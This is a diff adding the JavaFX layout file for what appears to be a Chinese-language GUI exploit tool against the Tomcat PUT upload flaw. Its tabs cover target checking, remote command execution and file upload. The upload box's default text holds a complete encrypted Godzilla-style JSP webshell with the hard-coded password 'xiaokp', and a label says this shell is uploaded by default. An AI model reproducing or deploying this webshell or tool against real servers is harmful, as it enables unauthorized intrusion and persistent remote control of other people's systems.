@@ -1,0 +1,161 @@
+<?xml version="1.0" encoding="UTF-8"?>
+
+<?import javafx.geometry.Insets?>
+<?import javafx.scene.control.Button?>
+<?import javafx.scene.control.Label?>
+<?import javafx.scene.control.Tab?>
+<?import javafx.scene.control.TabPane?>
+<?import javafx.scene.control.TextArea?>
+<?import javafx.scene.control.TextField?>
+<?import javafx.scene.layout.HBox?>
+<?import javafx.scene.layout.VBox?>
+<?import javafx.scene.text.Font?>
+
+<VBox maxHeight="-Infinity" maxWidth="-Infinity" minHeight="-Infinity" minWidth="-Infinity" prefHeight="597.0" prefWidth="600.0" xmlns="http://javafx.com/javafx/8.0.171" xmlns:fx="http://javafx.com/fxml/1" fx:controller="cn.xiaokp.Tomcat_PUT_EXP.Controller">
+    <children>
+        <HBox prefHeight="60.0" prefWidth="600.0">
+            <VBox.margin>
+                <Insets />
+            </VBox.margin>
+            <children>
+                <Label text="目标地址">
+                    <HBox.margin>
+                        <Insets top="20.0" />
+                    </HBox.margin>
+                    <font>
+                        <Font size="14.0" />
+                    </font>
+                </Label>
+                <TextField fx:id="targetAddress" prefHeight="27.0" prefWidth="461.0">
+                    <HBox.margin>
+                        <Insets left="4.0" top="18.0" />
+                    </HBox.margin>
+                </TextField>
+                <Button fx:id="checkBut" mnemonicParsing="false" onAction="#check" prefHeight="27.0" prefWidth="64.0" text="检测">
+                    <HBox.margin>
+                        <Insets left="4.0" top="18.0" />
+                    </HBox.margin>
+                </Button>
+            </children>
+        </HBox>
+        <TabPane tabClosingPolicy="UNAVAILABLE">
+            <tabs>
+                <Tab text="检测日志">
+                    <content>
+                        <VBox prefHeight="295.0" prefWidth="600.0">
+                            <children>
+                                <HBox>
+                                    <VBox.margin>
+                                        <Insets top="10.0" />
+                                    </VBox.margin>
+                                    <children>
+                                        <TextArea fx:id="logTextArea" prefHeight="625.0" prefWidth="580.0">
+                                            <font>
+                                                <Font size="16.0" />
+                                            </font>
+                                            <HBox.margin>
+                                                <Insets bottom="10.0" left="10.0" right="10.0" top="10.0" />
+                                            </HBox.margin>
+                                        </TextArea>
+                                    </children>
+                                </HBox>
+                            </children>
+                        </VBox>
+                    </content>
+                </Tab>
+                <Tab text="命令执行">
+                    <content>
+                        <VBox>
+                            <children>
+                                <HBox spacing="10.0">
+                                    <VBox.margin>
+                                        <Insets top="10.0" />
+                                    </VBox.margin>
+                                    <padding>
+                                        <Insets bottom="5.0" top="5.0" />
+                                    </padding>
+                                    <children>
+                                        <Label text="命令：">
+                                            <font>
+                                                <Font size="14.0" />
+                                            </font>
+                                            <HBox.margin>
+                                                <Insets left="10.0" right="10.0" top="2.0" />
+                                            </HBox.margin>
+                                        </Label>
+                                        <TextField fx:id="command" prefHeight="27.0" prefWidth="430.0">
+                                            <padding>
+                                                <Insets left="10.0" right="10.0" />
+                                            </padding>
+                                        </TextField>
+                                        <Button fx:id="execBut" mnemonicParsing="false" onAction="#exec" prefHeight="27.0" prefWidth="62.0" text="执行" />
+                                    </children>
+                                </HBox>
+                                <TextArea fx:id="commandEcho" prefHeight="398.0" prefWidth="580.0" wrapText="true">
+                                    <VBox.margin>
+                                        <Insets left="10.0" right="10.0" top="10.0" />
+                                    </VBox.margin>
+                                </TextArea>
+                            </children>
+                        </VBox>
+                    </content>
+                </Tab>
+            <Tab text="文件上传">
+               <content>
+                  <VBox>
+                     <children>
+                        <HBox spacing="10.0">
+                           <VBox.margin>
+                              <Insets top="10.0" />
+                           </VBox.margin>
+                           <padding>
+                              <Insets bottom="5.0" top="5.0" />
+                           </padding>
+                           <children>
+                              <Label text="文件名称:">
+                                 <font>
+                                    <Font size="14.0" />
+                                 </font>
+                                 <HBox.margin>
+                                    <Insets left="10.0" right="10.0" top="2.0" />
+                                 </HBox.margin>
+                              </Label>
+                              <TextField fx:id="fileName" prefHeight="27.0" prefWidth="430.0" promptText="shell.jsp">
+                                 <padding>
+                                    <Insets left="10.0" right="10.0" />
+                                 </padding>
+                              </TextField>
+                              <Button fx:id="uploadBtn" mnemonicParsing="false" onAction="#upload" prefHeight="27.0" prefWidth="62.0" text="上传" />
+                           </children>
+                        </HBox>
+                        <TextArea fx:id="shell" prefHeight="398.0" prefWidth="580.0" promptText="&lt;%! String xc=&quot;3c6e0b8a9c15224a&quot;; String pass=&quot;xiaokp&quot;; String md5=md5(pass+xc); class X extends ClassLoader{public X(ClassLoader z){super(z);}public Class Q(byte[] cb){return super.defineClass(cb, 0, cb.length);} }public byte[] x(byte[] s,boolean m){ try{javax.crypto.Cipher c=javax.crypto.Cipher.getInstance(&quot;AES&quot;);c.init(m?1:2,new javax.crypto.spec.SecretKeySpec(xc.getBytes(),&quot;AES&quot;));return c.doFinal(s); }catch (Exception e){return null; }} public static String md5(String s) {String ret = null;try {java.security.MessageDigest m;m = java.security.MessageDigest.getInstance(&quot;MD5&quot;);m.update(s.getBytes(), 0, s.length());ret = new java.math.BigInteger(1, m.digest()).toString(16).toUpperCase();} catch (Exception e) {}return ret; } public static String base64Encode(byte[] bs) throws Exception {Class base64;String value = null;try {base64=Class.forName(&quot;java.util.Base64&quot;);Object Encoder = base64.getMethod(&quot;getEncoder&quot;, null).invoke(base64, null);value = (String)Encoder.getClass().getMethod(&quot;encodeToString&quot;, new Class[] { byte[].class }).invoke(Encoder, new Object[] { bs });} catch (Exception e) {try { base64=Class.forName(&quot;sun.misc.BASE64Encoder&quot;); Object Encoder = base64.newInstance(); value = (String)Encoder.getClass().getMethod(&quot;encode&quot;, new Class[] { byte[].class }).invoke(Encoder, new Object[] { bs });} catch (Exception e2) {}}return value; } public static byte[] base64Decode(String bs) throws Exception {Class base64;byte[] value = null;try {base64=Class.forName(&quot;java.util.Base64&quot;);Object decoder = base64.getMethod(&quot;getDecoder&quot;, null).invoke(base64, null);value = (byte[])decoder.getClass().getMethod(&quot;decode&quot;, new Class[] { String.class }).invoke(decoder, new Object[] { bs });} catch (Exception e) {try { base64=Class.forName(&quot;sun.misc.BASE64Decoder&quot;); Object decoder = base64.newInstance(); value = (byte[])decoder.getClass().getMethod(&quot;decodeBuffer&quot;, new Class[] { String.class }).invoke(decoder, new Object[] { bs });} catch (Exception e2) {}}return value; }%&gt;&lt;%try{byte[] data=base64Decode(request.getParameter(pass));data=x(data, false);if (session.getAttribute(&quot;payload&quot;)==null){session.setAttribute(&quot;payload&quot;,new X(this.getClass().getClassLoader()).Q(data));}else{request.setAttribute(&quot;parameters&quot;,data);java.io.ByteArrayOutputStream arrOut=new java.io.ByteArrayOutputStream();Object f=((Class)session.getAttribute(&quot;payload&quot;)).newInstance();f.equals(arrOut);f.equals(pageContext);response.getWriter().write(md5.substring(0,16));f.toString();response.getWriter().write(base64Encode(x(arrOut.toByteArray(), true)));response.getWriter().write(md5.substring(16));} }catch (Exception e){}%&gt;" wrapText="true">
+                           <VBox.margin>
+                              <Insets left="10.0" right="10.0" top="10.0" />
+                           </VBox.margin>
+                        </TextArea>
+                        <HBox spacing="10.0">
+                           <padding>
+                              <Insets bottom="5.0" top="5.0" />
+                           </padding>
+                           <children>
+                              <Label alignment="CENTER" prefHeight="15.0" prefWidth="599.0" text="默认上传哥斯拉webshell，密码：xiaokp">
+                                 <font>
+                                    <Font size="12.0" />
+                                 </font>
+                                 <HBox.margin>
+                                    <Insets top="6.0" />
+                                 </HBox.margin>
+                              </Label>
+                           </children>
+                        </HBox>
+                     </children>
+                  </VBox>
+               </content>
+            </Tab>
+            </tabs>
+            <VBox.margin>
+                <Insets top="4.0" />
+            </VBox.margin>
+        </TabPane>
+    </children>
+</VBox>
